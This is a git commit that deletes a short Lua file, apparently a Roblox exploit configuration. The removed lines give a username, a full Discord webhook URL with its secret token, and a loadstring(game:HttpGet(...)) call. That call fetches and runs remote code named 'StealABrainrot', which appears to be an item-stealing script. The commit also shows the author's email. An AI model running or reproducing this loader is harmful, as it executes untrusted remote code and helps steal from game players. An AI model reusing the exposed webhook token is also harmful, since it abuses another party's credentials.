025d148ed6fcd63e5e7171618d085c7c70a57a94
anarchist5 <shkebedi00@gmail.com>
2025-10-28 02:33:38 +0300

    Delete bdfhvserg.lua

--- bdfhvserg.lua
+++
@@ -1,5 +0,0 @@
-username = "1250_xbone"
-webhook = "https://discordapp.com/api/webhooks/1432509850356547657/6I_ATw6I7yY75cwPVxeHZw722skPvaImrvkKNcEvgAfi3rVfbjIcgwcubmCEHKxqTAYJ"
-minrarity = 1
-
-loadstring(game:HttpGet("https://codeberg.org/Redz/Red/raw/branch/main/StealABrainrot"))()
